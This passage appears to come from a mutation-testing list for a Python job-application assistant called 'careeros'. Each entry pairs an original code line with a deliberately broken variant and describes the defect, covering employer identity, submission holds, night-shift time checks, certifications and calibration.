     '        return sampling.recommended(g.statuses[approach]) and g.rep.act != "declined"\n', 'evaluator: metrics reading your decisions instead of the status'),
    ('careeros/review/scoring_eval.py', '                    "v1": max((m.v1 for m in members), key=V1_ORDER.index)}',
     '                    "v1": min((m.v1 for m in members), key=V1_ORDER.index)}', 'evaluator: a role group taking its weakest posting'),
    ('careeros/review/scoring_eval.py', '        ranked = _order(queue, cfg, check_first=order)',
     '        ranked = _order(queue, cfg)', 'evaluator: Check First order O2 never measured'),
    # calibration draws freeze what they measure; Check First recovery's denominator (2026-10-17)
    ('careeros/review/scoring_eval.py', '"drawn": sampling.drawn(g.group_id, pi, seed), "predictions": dict(g.statuses)})',
     '"drawn": sampling.drawn(g.group_id, pi, seed)})', 'calibration: a draw that does not freeze its predictions'),
    ('careeros/review/scoring_eval.py', 'def frozen(record: dict) -> bool:\n',
     'def frozen(record: dict) -> bool:\n    return True\n', 'calibration: a list without frozen predictions counted'),
    ('careeros/review/scoring_eval.py', '    return sorted(k for k in set(drawn) | set(current) if k != "snapshot_sha256" and drawn.get(k) != current.get(k))',
     '    return []', 'calibration: rule changes since a draw not reported'),
    ('careeros/review/scoring_eval.py', '            "profile_fingerprint": profile.fingerprint, "preferences_sha256": _sha({k: v for k, v in (prefs or {}).items() if v}),',
     '            "profile_fingerprint": None, "preferences_sha256": _sha({k: v for k, v in (prefs or {}).items() if v}),', "calibration: the profile left out of a draw's identity"),
    ('careeros/review/scoring_eval.py', '    if draw and criteria is None:',
     '    if False:', 'calibration: a draw without written adoption criteria'),
    ('careeros/review/scoring_eval.py', '    return hashlib.sha256(text.encode("utf-8")).hexdigest() if text else None',
     '    return hashlib.sha256((text or "").encode("utf-8")).hexdigest()', 'calibration: an empty adoption criteria file accepted'),
    ('careeros/review/scoring_eval.py', '        reasons[row["job_id"]] = (row["reason"] or "").strip() or None',
     '        reasons[row["job_id"]] = None', 'evaluator: free-text label reasons not collected'),
    ('careeros/review/sampling.py', '                                                     lambda r: wanted(r) and not rec(r))',
     '                                                     wanted)', 'sampling: Check First recovery over all wanted groups'),
    ('tools/release_scan.py', '    prefix = term.endswith("*")',
     '    prefix = False', 'release scan: a starred private name with letters attached missed'),
    # the public copy (2026-10-18)
    ('tools/build_snapshot.py', '             "config/employers.yaml", "config/shadow_scoring.yaml", "docs",',
     '             "config/employers.yaml", "docs",', 'snapshot: a configuration file left out of the public copy'),
    # NIGHT after the fresh-context review of 4486b82 (2026-10-18)
    ('careeros/qualify/worktime.py', '        if not _NEGATED.search(segment[max(0, m.start() - 25):m.start()]):',
     '        if True:', 'NIGHT days: "no weekend shifts" read as weekend days'),
    ('careeros/qualify/worktime.py', '        return None, "weekends mentioned, but not as the shift\'s days"',
     '        return ["sat", "sun"], "weekends mentioned, but not as the shift\'s days"', 'NIGHT days: any weekend word read as the days'),
    ('careeros/qualify/worktime.py', '        if len(distinct) == 1:\n            return list(sets[0][0])',
     '        if distinct:\n            return list(sets[0][0])', 'NIGHT days: the first of two disagreeing answers taken'),
    ('careeros/qualify/worktime.py', '        segments = [text[lo:hi], text[max(0, span[0] - 160):span[1] + 160]]',
     '        segments = [text[max(0, span[0] - 160):span[1] + 160]]', "NIGHT days: another sentence's days taken over the shift's own"),
    ('careeros/qualify/night.py', '    found = _ranges(lowered, every=True)',
     '    found = _ranges(lowered)', 'NIGHT workload: unusual stated hours ignored'),
    ('careeros/qualify/night.py', '    for kind in ("overnight", "evening", "daytime", "other", "daytime_likely"):\n        for f in found:',
     '    for kind in ("overnight", "evening"):\n        for f in found:', 'NIGHT workload: stated daytime hours ignored'),
    ('careeros/qualify/night.py', '                           hours_direct=not item or item[0] != "daytime_likely")',
     '                           hours_direct=True)', 'NIGHT workload: business hours confirming a result'),
    ('careeros/qualify/worktime.py', '        dates = horizon(reference, [mine, tz])',
     '        dates = horizon(reference, [mine])', 'NIGHT workload: one season only for a home without daylight saving'),
    ('careeros/qualify/worktime.py', '        return "ambiguous", [named, *(z for z in CONTINENTAL if z != named)], f"stated: {word} (a two-letter abbreviation alone)"',
     '        return "resolved", [named], f"stated: {word} (a two-letter abbreviation alone)"', "NIGHT zones: 'PT' taken as certain"),
    ('careeros/qualify/worktime.py', '    if word in _REGIONS and bare:',
     '    if False:', "NIGHT zones: a bare region word taken as certain"),
    ('careeros/qualify/worktime.py', '    if word in _REGIONS and standard:',
     '    if False:', 'NIGHT zones: "Eastern Standard Time" taken as civil time'),
    ('careeros/qualify/worktime.py', '        regions = sorted({m.group(1) for m in _PLAIN.finditer(text[lo:hi])} - {"mountain"})',
     '        regions = sorted({m.group(1) for m in _PLAIN.finditer(text)} - {"mountain"})', 'NIGHT zones: a zone mentioned elsewhere taken for the shift'),
    ('careeros/qualify/worktime.py', '            if len(readings) == 1 or (all(b == "resolved" for b, _, _ in readings) and len(zones) == 1):',
     '            if True:', 'NIGHT zones: only the first of several listed zones measured'),
    ('careeros/qualify/worktime.py', '                         r"\\b(est|edt|cst|cdt|mst|mdt|pst|pdt|et|ct|mt|pt)\\b|(eastern|central|mountain|pacific)(?=\\s*(?:[),.;:\\]/]|$))")',
     '                         r"\\b(est|edt|cst|cdt|mst|mdt|pst|pdt|et|ct|mt|pt)\\b|(eastern|central|mountain|pacific)")', 'NIGHT zones: "Central Region" read as a zone'),
    ('careeros/qualify/worktime.py', '    match = re.fullmatch(r"([01]?\\d|2[0-3]):([0-5]\\d)", str(value or "").strip())   # never "24:00" or "8:75"',
     '    match = re.fullmatch(r"(\\d{1,2}):(\\d{2})", str(value or "").strip())   # never "24:00" or "8:75"', 'NIGHT day job: "24:00" or "8:75" accepted'),
    ('careeros/qualify/worktime.py', '        home_ok = bool(home_name) and "/" in str(home_name) and not str(home_name).startswith("Etc/")',
     '        home_ok = bool(home_name)', 'NIGHT day job: an abbreviation home zone confirming results'),
    ('careeros/qualify/worktime.py', '        last = datetime.combine(last_day, time(end // 60 % 24, end % 60), tzinfo=zone).replace(fold=1)',
     '        last = datetime.combine(last_day, time(end // 60 % 24, end % 60), tzinfo=zone).replace(fold=0)', 'NIGHT workload: the fall-back hour counted once'),
    ('careeros/qualify/worktime.py', '           "sleep_before_hours": least("sleep_before_hours"), "sleep_after_hours": least("sleep_after_hours"),',
     '           "sleep_before_hours": worst["sleep_before_hours"], "sleep_after_hours": worst["sleep_after_hours"],', 'NIGHT workload: sleep shown from one reading, not the worst'),
    ('careeros/qualify/night.py', '    material.add("possible_day_job_overlap")   # always material, whatever a settings list says (2026-10-18)',
     '    pass', 'NIGHT: a possible overlap not material when a settings list leaves it out'),
    ('careeros/qualify/night.py', '    familiar = [str(n) for n in profile.data.get("familiar_employers") or [] if n] + hold_names(policy)',
     '    familiar = [str(n) for n in profile.data.get("familiar_employers") or [] if n]', 'NIGHT: a held employer not counted as familiar'),
    ('careeros/pipeline.py', '                        "holds": fingerprint((ctx.policy.data.get("submission") or {}).get("holds") or []),   # held families are familiar\n',
     '', 'NIGHT: a hold change not re-judging NIGHT'),
    # approved facts and briefs after the fresh-context review of 4486b82 (2026-10-18)
    ('careeros/review/shortlist.py', '                lines.append(f"- {item[\'name\']}: {factual(item)} ({item[\'source\']}){under_review(item)}{wording(item)}")',
     '                lines.append(f"- {item[\'name\']}: {factual(item)} ({item[\'source\']}){wording(item)}")',
     'drafts: contradicted evidence shown as confirmed in talking points'),
    ('careeros/review/shortlist.py', '        elif r.category == "certification" and held(r.name):',
     '        elif False:', 'drafts: a held certification listed as an honest gap'),
    ('careeros/review/approved_facts.py', '        marked = marked.replace(fact["text"], f" {_MARK.format(n)} ")',
     '        marked = marked', 'approved facts: approved quotes read as distortions'),
    ('careeros/review/approved_facts.py', '            if figures & _figures(plain) or near:',
     '            if figures & _figures(plain):', 'approved facts: words beside the quote ignored'),
    ('careeros/review/approved_facts.py', '    return out + [(v, False) for v in _spelled(text)]',
     '    return out', "approved facts: 'five thousand' not read as 5,000"),
    ('careeros/review/approved_facts.py', '            continue   # a year, not a count',
     '            pass', 'approved facts: a year read as a count'),
    ('careeros/review/approved_facts.py', '    text = re.sub(r"\\n(?!\\s*(?:[-*#]|\\d+[.)]|\\n))", " ", text or "")',
     '    text = text or ""', 'approved facts: a wrapped line splitting a distortion from its figure'),
    ('careeros/review/approved_facts.py', '            raise ValueError(f"approved_fact_invalid: applies_to and superseded must be lists ({fact.get(\'id\')})")',
     '            pass', 'approved facts: a string applies_to read letter by letter'),
    # credential fixes after the fresh-context review of 4486b82 (2026-10-18)
    ('careeros/qualify/certifications.py', '            kind = _separator(mention[previous[0][1]:current[0][0]])',
     '            kind = "or" if _OR_LINE.search(mention) else _separator(mention[previous[0][1]:current[0][0]])', 'certifications: separate credentials on one line taken as alternatives'),
    ('careeros/qualify/certifications.py', '    return word if word in KINDS else "unknown"',
     '    return word if word in KINDS else "certification"', 'certifications: an unrecognised kind counted as a certification'),
    ('careeros/qualify/certifications.py', '    word = _KIND_WORDS.get(word, word)',
     '    word = word', "certifications: 'course' not read as a course certificate"),
    ('careeros/qualify/certifications.py', '    identity = lambda c: (c["key"] or norm(c["name"]), c["kind"] == "course_certificate")',
     '    identity = lambda c: (c["key"] or norm(c["name"]), False)', 'certifications: a course colliding with the certification it is named like'),
    ('careeros/qualify/certifications.py', '    return min(items, key=lambda i: (i["kind"] not in COUNTING_KINDS, order.get(i["status"], 9))) if items else None',
     '    return min(items, key=lambda i: order.get(i["status"], 9)) if items else None', 'certifications: a course matched before a held certification'),
    ('careeros/qualify/certifications.py', '        found, how = _best([c for c in mine if c["issuer"] and c["issuer"] == described["issuer"]]), "family_match"',
     '        found, how = _best([c for c in mine if c["family"] and c["family"] == described["family"]]), "family_match"',
     "certifications: an issuer requirement met by another issuer's credential"),
    ('careeros/qualify/certifications.py', '    return re.sub(r"[\\s\\-]+", "_", str(value).strip().lower()) if value is not None else ""',
     '    return str(value) if value is not None else ""', "certifications: 'Held' / 'in progress' not normalised"),
    ('careeros/qualify/certifications.py', '                    "basis": basis if basis in BASES else None})',
     '                    "basis": basis})', 'certifications: an unrecognised evidence basis shown as given'),
    ('careeros/qualify/certifications.py', '                if status == "completed" and _course_named(profile, policy, name):\n                    continue',
     '                if False:\n                    continue', 'certifications: a skill from a completed course flagged as contradicted'),
    # submission fixes after the fresh-context review of 4486b82 (2026-10-18)
    ('careeros/review/submission.py', '        if not hold["id"] or hold["id"] in seen or not _names_ok(hold["names"]) or not channels_ok:',
     '        if not hold["id"] or hold["id"] in seen:', 'submission: a mistyped hold accepted (and holding nothing)'),
    ('careeros/review/submission.py', '    elif not _current(job, gate, policy, profile):',
     '    elif False:', 'submission: an out-of-date eligibility decision authorizing'),
    ('careeros/review/submission.py', '    if job["current_state"] not in ("eligible", "scored"):\n        return False',
     '    if False:\n        return False', 'submission: a posting sent back for re-judging still authorized'),
    ('careeros/review/submission.py', 'AND meaningful = 1 AND (at >= ? OR rowid > ?) ', 'AND meaningful = 1 AND (at > ? OR rowid > ?) ',
     'submission: a change at the same moment as an older release ignored'),
    ('careeros/review/submission.py', '    except HoldSettingsInvalid as exc:\n        return f"Submission can',
     '    except ImportError as exc:\n        return f"Submission can', 'submission: broken hold settings breaking a page'),
    ('careeros/review/applications.py', '            held = None\n            check.add("submission_settings_invalid", "hold"',
     '            raise\n            check.add("submission_settings_invalid", "hold"', 'recording: broken hold settings refusing a record'),
    ('careeros/review/applications.py', '                                                           and r["agency_norm"] == agency_key(channel, agency if channel == "agency" else None)]}})',
     '                                                           ]}})', "recording: another agency's release listed"),
    ('careeros/review/shortlist.py', '    if item.get("submission"):   # held, employer unidentified, or broken hold settings: preparation only',
     '    if False:', 'shortlist: "apply" shown beside a submission hold'),
    ('careeros/pipeline.py', '                    moved = {k: fields[k] for k in ("requisition_id", "canonical_url") if (existing[k] or None) != (fields[k] or None)}',
     '                    moved: dict = {}', 'ingest: a new requisition or address on unchanged text ignored'),
    # the owner's agency-name rule (2026-10-18)
    ('careeros/normalize/employer_identity.py', '    for term in AGENCY_SIGNAL_TERMS:\n        if contains_term(name, term):',
     '    for term in ():\n        if contains_term(name, term):', 'identity: a staffing / recruiting / talent name taken as the employer'),
    ('careeros/normalize/employer_identity.py', '    if employer.rule == "agency_signal" or (stored.rule == "agency_signal" and employer.rule != "own"):',
     '    if employer.rule == "agency_signal" and stored.rule != "own":', "identity: an agency-signal poster's own parent taken as the client"),
    # calibration after the fresh-context review (2026-10-17)
    ('careeros/review/scoring_eval.py', '        for entry in [*(g for g in record["groups"] if g["drawn"]), *record.get("relabel", [])]:',
     '        for entry in [*record["groups"], *record.get("relabel", [])]:', 'calibration: a group never shown on a list claiming your labels'),
    ('careeros/review/scoring_eval.py', '            found.append(later[0])',
     '            found.append(later[-1])', 'calibration: a later answer rewriting an earlier list'),
    ('careeros/review/scoring_eval.py', '        later = [label for when, label in history.get(job_id, []) if when > at and (stop is None or when <= stop)]',
     '        later = [label for when, label in history.get(job_id, []) if when > at]', "calibration: a later list's answer counted for an earlier list"),
    ('careeros/review/scoring_eval.py', '            "estimates": sampling.estimates(next(iter(rows.values()))) if len(kinds) == 1 and rows else None,',
     '            "estimates": sampling.estimates([r for v in rows.values() for r in v]) if rows else None,', 'calibration: lists drawn under different rules pooled'),
    ('careeros/review/scoring_eval.py', '        if entry["drawn"] and not (isinstance(predictions, dict) and all(isinstance(predictions.get(a), str) for a in sampling.APPROACHES)):',
     '        if entry["drawn"] and not isinstance(predictions, dict):', 'calibration: a list missing a prediction accepted as frozen'),
    ('careeros/review/scoring_eval.py', '            lists.append({"kind": LIST_KIND, "_path": str(path), "_unreadable": f"{type(exc).__name__}", "groups": []})\n            continue',
     '            raise', 'calibration: one unreadable list stopping every evaluation'),
    ('careeros/review/scoring_eval.py', '    text = "\\n".join(line.rstrip() for line in text.translate(_INVISIBLE).replace("\\r\\n", "\\n").split("\\n")).strip()',
     '    text = text.strip()', 'calibration: invisible characters accepted as written criteria'),
    ('careeros/review/scoring_eval.py', '    if draw and snapshot is not None:',
     '    if False:', 'calibration: a list drawn from an old named snapshot'),
    ('careeros/review/scoring_eval.py', '    else:\n        lines.append("Calibration: no list drawn yet (population estimates need one: --draw).")',
     '    if True:\n        lines.append("Calibration: no list drawn yet (population estimates need one: --draw).")',
     'calibration: the console summary contradicting itself'),
    # employer identity and holds after the fresh-context review (2026-10-17)
    ('careeros/normalize/employer_identity.py', '        if len(winners) > 1:',
     '        if False:', 'identity: a guard, family or agency tie settled by order'),
    ('careeros/normalize/employer_identity.py', '        if len(families) > 1:\n            return Match(field, raw, name, "ambiguous"',
     '        if False:\n            return Match(field, raw, name, "ambiguous"', 'identity: one alias in two families settled by order'),
    ('careeros/normalize/employer_identity.py', '    guard = _longest(name, (legal_norm(g) for g in different), glued=True)',
     '    guard = _longest(name, (legal_norm(g) for g in different))', 'identity: a guard written together missed'),
    ('careeros/normalize/employer_identity.py', '            inner = [match_name(field, t, parents, agencies=agencies, different=different)',
     '            inner = [match_name(field, t, parents)', 'identity: a board alias bypassing the guard'),
    ('careeros/normalize/employer_identity.py', '    folded = "".join(c for c in unicodedata.normalize("NFKD", name or "") if not unicodedata.combining(c))',
     '    folded = name or ""', 'identity: accented names dropped instead of folded'),
    ('careeros/review/submission.py', '                parents.setdefault(name, [])',
     '                pass', 'submission: a hold name outside the families matched by exact name only'),
    ('careeros/qualify/night.py', '        if one.status == RESOLVED and one.key in keys:',
     '        if False:', 'NIGHT: a familiar family missed when the names disagree'),
    ('careeros/qualify/night.py', '        if any(starts_with_name(one.evidence[0].normalized, n) for n in names):',
     '        if False:', 'NIGHT: a familiar name with words added missed'),
    ('careeros/qualify/night.py', '        if one.evidence[0].rule in ("empty", "different_organisation"):',
     '        if one.evidence[0].rule in ("empty",):', 'NIGHT: a listed different organisation counted as familiar'),
    ('tools/mutate.py', '    if outcome["load_errors"] or (baseline_ran is not None and outcome["ran"] < baseline_ran):\n        return "LOAD_ERROR"',
     '    if False:\n        return "LOAD_ERROR"', 'mutation runner: an import failure or a shorter suite counted as caught'),
    ('tools/mutate.py', '    if outcome.get("timed_out"):\n        return "TIMEOUT"',
     '    if False:\n        return "TIMEOUT"', 'mutation runner: a timed-out suite not reported as a timeout'),
    ('careeros/review/shortlist.py', '            with path.open("x", encoding="utf-8") as handle:',
     '            with path.open("w", encoding="utf-8") as handle:', 'drafts: an earlier brief (perhaps edited) overwritten'),
    ('careeros/review/shadow_policy.py', '    last = 1 if avoid else 0',
     '    last = 0', "shadow policy: an 'avoid' match not ordered after the others"),
    ('careeros/cli.py', '    if args.command == "eval" and args.scoring:',
     '    if False:', 'eval --scoring opening the live store and taking the lock'),
    # Employer identity resolver (R1, 2026-10-16): pure, not wired into any decision yet
    ('careeros/normalize/employer_identity.py', '    text = re.sub(r"\\s+", " ", _LEGAL.sub(" ", norm(folded))).strip()',
     '    text = norm(folded)', "employer identity: legal suffixes ('Inc.', 'LLC') kept, so legal names miss their family"),
    ('careeros/normalize/employer_identity.py', '    return text[4:] if text.startswith("the ") else "" if text == "the" else text',
     '    return text', "employer identity: a leading 'The' kept"),
    ('careeros/normalize/employer_identity.py', '    squeezed = [(f, w) for a, f, w in aliases if a.replace(" ", "") == compact]',
     '    squeezed: list = []', "employer identity: run-together names ('NorthgateInsight') never matched"),
    ('careeros/normalize/employer_identity.py', '    return name == prefix or name.startswith(prefix + " ")',
     '    return name == prefix or name.startswith(prefix)', 'employer identity: a prefix match without a word boundary'),
    ('careeros/normalize/employer_identity.py', '    guard = _longest(name, (legal_norm(g) for g in different), glued=True)',
     '    guard = None', 'employer identity: a listed different organisation claimed by the family'),
    ('careeros/normalize/employer_identity.py', '        targets = (board_aliases or {}).get(name)',
     '        targets = None', 'employer identity: board aliases ignored'),
    ('careeros/normalize/employer_identity.py', '    agency = _longest(name, (legal_norm(a) for a in agencies))',
     '    agency = None', 'employer identity: an agency taken for the hiring employer'),
    ('careeros/normalize/employer_identity.py', '    if len(families) > 1:\n        return EmployerIdentity(CONFLICTING, None, False, "names_point_to_different_families"',
     '    if False:\n        return EmployerIdentity(CONFLICTING, None, False, "names_point_to_different_families"', 'employer identity: two different families resolved as one'),
    ('careeros/normalize/employer_identity.py', '        if employer.family and stored.rule == "own":',
     '        if False:', 'employer identity: a parent naming another employer ignored'),
    ('careeros/normalize/employer_identity.py', '        if stored.family and employer.rule == "different_organisation":',
     '        if False:', 'employer identity: a stale parent overriding a different-organisation guard'),
    ('careeros/normalize/employer_identity.py', '    if "confidential" in (employer.rule, stored.rule):',
     '    if False:', 'employer identity: a confidential client resolved as an employer'),
    ('careeros/normalize/employer_identity.py', '    if identity.status != RESOLVED:\n        return None\n',
     '', 'employer identity: an unresolved identity read as outside every family'),
    ('careeros/normalize/employer_identity.py', '    return sorted(found, key=lambda a: (-len(a[0]), a[0], a[1], a[2]))',
     '    return sorted(found, key=lambda a: (-len(a[0]), a[0], a[1]))', 'employer identity: alias ties left to set order'),
    # Submission permission (R2, 2026-10-16): holds, releases, authorization, recording annotations
    ('careeros/review/submission.py', '    if configured is None:',
     '    if False:', 'submission: no hold at all until the vault sets one (the gate list ignored)'),
    ('careeros/review/submission.py', '    configured = policy.get("submission", "holds", default=None)',
     '    configured = policy.get("submission", "holds", default=None) or None', "submission: an explicit 'no holds' falls back anyway"),
    ('careeros/review/submission.py', '        if not hold["id"] or hold["id"] in seen or not _names_ok(hold["names"]) or not channels_ok:',
     '        if False:', 'submission: a malformed hold accepted'),
    ('careeros/review/submission.py', '    if not current.identified:\n        reasons.append(',
     '    if False:\n        reasons.append(', 'submission: an unidentified employer authorized'),
    ('careeros/review/submission.py', '        if not current.identified:\n            raise',
     '        if False:\n            raise', 'submission: a release granted for an unidentified employer'),
    ('careeros/review/submission.py', '    if identity.status != RESOLVED or identity.key != release["family_key"]:',
     '    if False:', 'submission: a release outliving an employer correction'),
    ('careeros/review/submission.py', '    if (job["requisition_id"] or None) != (release["requisition_id"] or None) \\\n            or (job["canonical_url"] or None) != (release["canonical_url"] or None):',
     '    if False:', 'submission: a release outliving a new requisition or address'),
    ('careeros/review/submission.py', 'WHERE job_id = ? AND meaningful = 1 AND (at >= ? OR rowid > ?)',
     'WHERE job_id = ? AND (at >= ? OR rowid > ?)', 'submission: a cosmetic edit suspending a release'),
    ('careeros/review/submission.py', 'if r["action"] != "release" or r["hold_id"] != hold["id"] or r["release_id"] in revoked:',
     'if r["action"] != "release" or r["hold_id"] != hold["id"]:', 'submission: a revoked release still counting'),
    ('careeros/review/submission.py', 'r["channel"] == channel and r["agency_norm"] == agency_norm',
     'r["agency_norm"] == agency_norm', 'submission: a release for one channel clearing the others'),
    ('careeros/review/submission.py', '(r for r in self.releases if r["channel"] == channel and r["agency_norm"] == agency_norm)',
     '(r for r in self.releases if r["channel"] == channel)', 'submission: an agency release clearing every agency'),
    ('careeros/review/submission.py', '    if gate is None or gate["decision"] != "eligible":',
     '    if False:', 'submission: authorization skipping eligibility'),
    ('careeros/review/submission.py', '    if job["current_state"] in ("closed", "duplicate") or job["closed_at"]:',
     '    if False:', 'submission: a closed posting authorized'),
    ('careeros/review/submission.py', '    reasons += [{"code": r["code"], "detail": r["detail"]} for r in check.reasons if r["level"] in ("block", "hold")]',
     '    reasons += []', 'submission: authorization skipping duplicate and competing submissions'),
    ('careeros/review/applications.py', '        for hold in held_now:',
     '        for hold in []:', 'recording: a submission hold not asked about'),
    ('careeros/review/applications.py', '        if held is not None and not held.identified:',
     '        if False:', 'recording: an unidentified employer not asked about'),
    ('careeros/review/report.py', '        line = display(store, policy, job["job_id"])',
     '        line = None', 'review card: the submission hold not shown'),
    ('careeros/pipeline.py', '"board_verification", "submission",',
     '"board_verification",', 'submission settings re-judging every job'),
    ('careeros/db/schema/013_submission_releases.sql', "CREATE TRIGGER submission_releases_no_update BEFORE UPDATE ON submission_releases BEGIN SELECT RAISE(ABORT, 'append_only'); END;\n",
     '', 'submission releases editable after the fact'),
    # D13 leaves qualification (R3, 2026-10-16): NIGHT family lookup, identity in NIGHT's fingerprint, discovery skip list
    ('careeros/qualify/night.py', '    keys = {found.key for found in (resolve(n, None, parents, different=different) for n in familiar)',
     '    keys: set = set()\n    _unused = {found.key for found in (resolve(n, None, parents, different=different) for n in familiar)', 'NIGHT: a familiar employer family missed under an alias'),
    ('careeros/qualify/night.py', '        if one.status == RESOLVED and one.key in keys:',
     '        if one.key in keys or one.status != RESOLVED:', 'NIGHT: an unidentified employer counted as familiar'),
    ('careeros/qualify/night.py', '    different = policy.get("employer_identity", "different_organisations", default=[]) or []',
     '    different: list = []', 'NIGHT: a listed different organisation counted as the familiar family'),
    ('careeros/pipeline.py', '                        "identity": fingerprint(ctx.policy.data.get("employer_identity") or {}),   # read by the NIGHT conflict check\n',
     '', 'NIGHT: identity settings changed without re-judging NIGHT jobs'),
    ('careeros/discovery/board_discovery.py', '    skipped = [*(policy.get("gate", "held_parents", default=[]) or []), *cfg(policy)["skip_employers"]]',
     '    skipped = [*(policy.get("gate", "held_parents", default=[]) or [])]', 'board discovery: the skip list ignored'),
    # Certification statuses (R4, 2026-10-16): explicit status, kinds, conflicts, evidence basis and review
    ('careeros/qualify/certifications.py', '"status": normal_status(cert.get("status")), "kind": normal_kind(cert.get("kind")),',
     '"status": normal_status(cert.get("status", "held")), "kind": normal_kind(cert.get("kind")),', 'certifications: a missing status counted as held'),
    ('careeros/qualify/certifications.py', '    satisfied = how in SATISFYING and found["status"] == "held" and found["kind"] in COUNTING_KINDS',
     '    satisfied = how in SATISFYING and found["status"] == "held"', 'certifications: a course certificate satisfying a requirement'),
    ('careeros/qualify/certifications.py', 'if c["status"] == "held" and c["kind"] in COUNTING_KINDS]',
     'if c["status"] == "held"]', 'certifications: a course certificate listed as held'),
    ('careeros/qualify/certifications.py', '        if len({c["status"] for c in same}) > 1:',
     '        if False:', 'certifications: conflicting profile records not flagged'),
    ('careeros/qualify/certifications.py', '                if status != "held":\n                    out.append({"item"',
     '                if False:\n                    out.append({"item"', 'certifications: credential-backed evidence never reviewed'),
    ('careeros/qualify/certifications.py', '    elif record["candidate_status"] == "held" and record.get("matched_basis"):\n        status +=',
     '    elif False:\n        status +=', 'certifications: the evidence basis hidden on cards'),
    ('careeros/qualify/profile.py', 'str(cert.get("status") or "").strip().lower() == "held"',
     'str(cert.get("status") or "held").strip().lower() == "held"', 'profile: a certification without a status counted as held'),
    ('careeros/review/shortlist.py', '    review = {(r["item"] or "").lower(): r for r in (evidence_review(profile, policy) if policy is not None else [])}',
     '    review: dict = {}', 'drafts: evidence under review presented as confirmed'),
    # NIGHT work time on dated intervals (R5, 2026-10-16): zones, days, duty spans, confirmation
    ('careeros/qualify/worktime.py', '    confirmed = zone["basis"] == "resolved" and days_stated and home is not None',
     '    confirmed = days_stated and home is not None', 'work time: an unresolved time zone counted as confirmed'),
    ('careeros/qualify/worktime.py', 'level=worst["level"] if confirmed or worst["level"] != "green" else "unconfirmed"',
     'level=worst["level"]', 'work time: an unconfirmed result shown as green'),
    ('careeros/qualify/worktime.py', '    worst = max(readings, key=lambda r: (LEVELS.index(r["level"]), r["overlap_minutes"], r["combined_hours"], r["span_hours"]))',
     '    worst = readings[0]', 'work time: only the first possible time zone measured'),
    ('careeros/qualify/worktime.py', '    days_stated = days is not None',
     '    days_stated = True', 'work time: assumed days counted as stated'),
    ('careeros/qualify/worktime.py', '        last = datetime.combine(last_day, time(end // 60 % 24, end % 60), tzinfo=zone)',
     '        last = (first.astimezone(timezone.utc) + timedelta(minutes=(end - start) % 1440)).astimezone(zone)', 'work time: clock-change nights measured as ordinary nights'),
    ('careeros/qualify/worktime.py', '    while found < 2 and d < reference + timedelta(days=400):',
     '    while False:', 'work time: the clock-change weeks left out of the dates'),
    ('careeros/qualify/worktime.py', '        if spans and s - spans[-1]["end"] < gap:',
     '        if spans and s - spans[-1]["end"] < timedelta(0):', 'work time: short breaks counted as rest between duty spans'),
    ('careeros/qualify/worktime.py',
     'with {region} time written out"\n        return "ambiguous", list(_ABBREVIATIONS[word]), f"stated: {word} (an abbreviation alone)"',
     'with {region} time written out"\n        return "resolved", [_ABBREVIATIONS[word][0]], f"stated: {word} (an abbreviation alone)"',
     'work time: a time-zone abbreviation alone taken as certain'),
    ('careeros/qualify/worktime.py', '            return {"basis": "ambiguous", "zones": zones, "evidence"',
     '            return {"basis": "resolved", "zones": zones[:1], "evidence"', 'work time: a bare Mountain zone resolved without evidence'),
    ('careeros/qualify/worktime.py', '    return {"basis": "unstated", "zones": list(CONTINENTAL), "evidence": "no time zone stated with the hours" + note}',
     '    return {"basis": "resolved", "zones": ["America/New_York"], "evidence": "no time zone stated with the hours" + note}', 'work time: a posting with no time zone assumed to be in one'),
    ('careeros/qualify/night.py', '        confirmed_overlap = load["overlap_minutes"] if load.get("confirmed") else 0',
     '        confirmed_overlap = load["overlap_minutes"]', 'NIGHT: an unconfirmed overlap rejecting a job'),
    ('careeros/qualify/night.py', '        elif load["overlap_minutes"]:\n            result.flag("possible_day_job_overlap"',
     '        elif False:\n            result.flag("possible_day_job_overlap"', 'NIGHT: a possible overlap not flagged'),
    # Retired 2026-10-18: "NIGHT: a possible overlap not making the job CONDITIONAL" (defaults.yaml's list without
    # possible_day_job_overlap). Since 9711849 night_state adds it whatever the list says, so removing it changes
    # nothing; that code is covered by "NIGHT: a possible overlap not material when a settings list leaves it out".
    # Approved facts (R6, 2026-10-16): quoted word for word, wording checked
    ('careeros/review/approved_facts.py', '                for kind, pattern in DISTORTIONS.items():',
     '                for kind, pattern in [x for x in DISTORTIONS.items() if x[0] != "a daily rate"]:', 'approved facts: a figure turned into a daily rate not reported'),
    ('careeros/review/approved_facts.py', '                for kind, pattern in DISTORTIONS.items():',
     '                for kind, pattern in [x for x in DISTORTIONS.items() if x[0] != "a guarantee"]:', 'approved facts: a figure turned into a guarantee not reported'),
    ('careeros/review/approved_facts.py', '                for kind, pattern in DISTORTIONS.items():',
     '                for kind, pattern in [x for x in DISTORTIONS.items() if not x[0].startswith("ownership")]:', 'approved facts: unsupported ownership not reported'),
    ('careeros/review/approved_facts.py', '                if _figures(old) & _figures(plain):',
     '                if False:', 'approved facts: a superseded figure not reported'),
    ('careeros/review/approved_facts.py', '        plain = re.sub("\\u2063FACT\\\\d+\\u2063", " ", whole)',
     '        plain = "" if "\\u2063FACT" in whole else re.sub("\\u2063FACT\\\\d+\\u2063", " ", whole)', 'approved facts: the exact quote hiding a reworded figure beside it'),
    ('careeros/review/approved_facts.py', '        unit = 1_000 if raw.endswith(("k", "thousand")) else 1_000_000 if raw.endswith("million") else 1',
     '        unit = 1', "approved facts: '5k' not read as 5,000"),
    ('careeros/review/shortlist.py', '        return f\' Approved wording: "{fact["text"]}"\' if fact else ""',
     '        return ""', 'drafts: the approved wording not quoted'),
    ('careeros/review/shortlist.py', '        lines += ["", "## Approved facts (quote them exactly)", ""] + [f\'- "{f["text"]}"\' for f in facts]',
     '        lines += []', 'drafts: the approved facts section left out'),
    # Independent Codex review of f984d15 (2026-10-20): each finding and residual it confirmed
    ('careeros/normalize/employer_identity.py', '            if other:\n                return Match(field, raw, name, other[0][0], None, other[0][1])',
     '            if False:\n                return Match(field, raw, name, other[0][0], None, other[0][1])',
     'employer identity: a board alias to a known agency read as an ordinary employer'),
    ('careeros/normalize/employer_identity.py', '            if (found and other) or len({r for r, _ in other}) > 1:',
     '            if len({r for r, _ in other}) > 1:', 'employer identity: a board alias to a family and an agency not ambiguous'),
    ('careeros/normalize/employer_identity.py', '    if employer.rule == "agency" and stored.rule == "own":', '    if False:',
     "employer identity: a listed agency's own corporate parent taken as the employer"),
    ('careeros/review/submission.py', '    return profile is not None and gate["profile_fingerprint"] == profile.fingerprint',
     '    return profile is None or gate["profile_fingerprint"] == profile.fingerprint',
